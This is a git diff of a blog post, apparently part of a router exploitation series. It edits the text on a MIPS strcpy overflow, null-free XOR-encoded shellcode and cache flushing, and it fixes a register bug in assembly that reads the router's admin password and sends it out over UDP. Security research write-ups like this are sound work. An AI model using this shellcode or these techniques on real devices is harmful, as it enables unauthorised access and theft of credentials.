@@ -39,7 +39,7 @@ As you can see from the crash dump, we have determined the expected values for *
 
 ![3_bytes_7_bits_expected.png]({{site.baseurl}}/assets/images/analysing_a_dirt_cheap_router_part_4/3_bytes_7_bits_expected.png)
 
-The last bit has 2 possible values, so we can just try both of these values for *$s0* in the overflow until there is not a crash - the last byte was determined to be *0x0*.
+The last bit has 2 possible values, so we can just try both of these values for *$s0* in the overflow until there is not a crash - the last byte was determined to be *0x0* which makes sense because allignment.
 
 So, here are the values we need to get back into the respective registers to continue execution:
 
@@ -51,7 +51,7 @@ So, here are the values we need to get back into the respective registers to con
 | *$s3* | *0x802ab9f4* |
 | *$ra* | *0x801888e0* |
 
-The last thing to mention about these addresses is that they contain 0's, which we obviously cannot send as this is a *strcpy* overflow. However, as long as *$s0* and *$s1* are alligned on the 4-byte boundary, they can be basically any value and nothing seems to break, which is good for us! I changed all of the 0's to 4's and tested with these value and there was no crash, nice.
+The last thing to mention about these addresses is that they contain 0's, which we obviously cannot send as this is a *strcpy* overflow. However, as long as *$s0* and *$s1* are alligned on the 4-byte boundary, they can be basically any value and nothing seems to break, which is good for us! I changed all of the 0's to 4's and tested with these values and there was no crash, nice.
 
 ## Reversing Stack Layout
 
@@ -187,7 +187,7 @@ Similar to the instruction cache, the data cache also exploits the principle of 
 
 ### Why are they annoying?
 
-The main reason the instruction cache is annoying is because it makes the use of self-modifying shellcode a little bit more difficult. As mentioned earlier, nearby instructions are loaded into the instruction cache and executed from there (as it is quicker). If we modify the instructions in memory with our shellcode by decoding it, for example, the processor will continue to fetch the only instructions from the instruction cache. 
+The main reason the instruction cache is annoying is because it makes the use of self-modifying shellcode a little bit more difficult. As mentioned earlier, nearby instructions are loaded into the instruction cache and executed from there (as it is quicker). If we modify the instructions in memory with our shellcode by decoding it, for example, the processor will continue to fetch the instructions from the instruction cache which are not decoded. 
 
 To fix this issue, the instruction cache must be flushed. This would remove the old instructions from the cache, forcing the new instructions to be loaded back into the cache from memory and executed. 
 
@@ -230,7 +230,7 @@ The input values are as follows:
 | *$s2* | Encoded length of encoded shellcode |
 | *$s3* | XOR key (I used *0xf6f6f6f6*) |
 
-As this is not encoded, some modifications had to be made to remove any 0's in the generated machine code. The first is that an offset of *0x1010* had to be used in a couple of places, as the offset makes up 2 bytes, setting it to *0x1010* prevents the offset bytes from being 0. The second is how *$s1* is increased by 4, again, the immediate value we are adding is 2 bytes, so adding 4 will result in '0x00 0x04' being in our payload. Therefore, the first modifying addition has to be greater than *0x100*, the second doesn't matter as much as it is negative, but it must result in *$s1* being increased by 4.
+As this is not encoded, some modifications had to be made to remove any 0's in the generated machine code. The first is that an offset of *0x1010* had to be used in a couple of places, as the offset makes up 2 bytes, setting it to *0x1010* prevents the offset bytes from being 0. The second is how *$s1* is increased by 4, again, the immediate value we are adding is 2 bytes, so adding 4 will result in *0x00 0x04* being in our payload. Therefore, the first modifying addition has to be greater than *0x100*, the second doesn't matter as much as it is negative, but it must result in *$s1* being increased by 4.
 
 ## Fix Shellcode
 
@@ -310,10 +310,10 @@ The input parameters are as follows:
 
 | Register | Value |
 | - | - |
-| *$s0* | Address of strlen function |
-| *$s1* | Address of 0x1010200 (config ID of admin password - refer to part 3) |
+| *$s0* | Address of *strlen* function |
+| *$s1* | Address of *0x1010200* (config ID of admin password - refer to part 3) |
 | *$s2* | Address we will use to store the admin password |
-| *$s3* | Address of socket function |
+| *$s3* | Address of *socket* function |
 
 - First, we call `config_get(0x1010200, buffer)`, remember the the instruction after `jalr` is taken before the jump takes place (thanks branch delay slot):
 
@@ -341,7 +341,7 @@ lui $v0, 0x800f;
 or $v0, $v0, 0x9528;
 lw $v0, ($v0);      /* load value of hardcoded_afinet into v0 */
 lui $t0, 0x802a;
-or $s1, $s1, 0xbf10;
+or $s1, $t0, 0xbf10;
 sw $v0, ($s1);      /* save hardcoded_afinet value to address of sockaddr */
 addiu $t0, $s1, 0x4;
 lui $v0, 0x02bc;
@@ -396,10 +396,6 @@ And here are the contents of the UDP packet containing the password:
 We can see the password is *th35he11c0d3w0rk5*!
 
 ![anonymous_cat.jpg]({{site.baseurl}}/assets/images/analysing_a_dirt_cheap_router_part_4/anonymous_cat.jpg)
-
-### Cache Issue
-
-I did run into an issue with one of the caches I mentioned earlier when testing the shellcode. The issue was the data cache when the *sockaddr* struct was constructed; the data was being modified in the data cache, but not actually being flushed into main memory before it was used in the *sento* call. I fixed this by moving the construction of the *sockaddr* struct before the *socket* call, the fact *socket* uses a very different area of memory must cause the data cache to be flushed, fixing our issue.
 
 # Conclusion
 
